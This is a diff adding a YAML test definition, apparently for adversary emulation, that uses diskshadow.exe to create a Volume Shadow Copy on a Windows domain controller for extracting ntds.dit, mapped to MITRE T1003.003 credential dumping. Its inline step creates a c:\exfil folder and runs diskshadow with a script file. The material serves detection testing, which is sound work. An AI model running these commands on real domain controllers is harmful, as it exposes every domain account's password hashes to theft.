@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Create Volume Shadow Copy with diskshadow
+description: |
+    This test is intended to be run on a domain controller
+    An alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit
+args:
+    - name: filename
+      type: Path
+      default: PathToAtomicsFolder\T1003.003\src\diskshadow.txt
+uuid: b385996c-0e7d-4e27-95a4-aca046b119a7
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.003: NTDS'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: create-volume-shadow-copy-with-diskshadow
+      inline: |
+        mkdir c:\exfil
+        diskshadow.exe /s {{.Args.filename}}
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
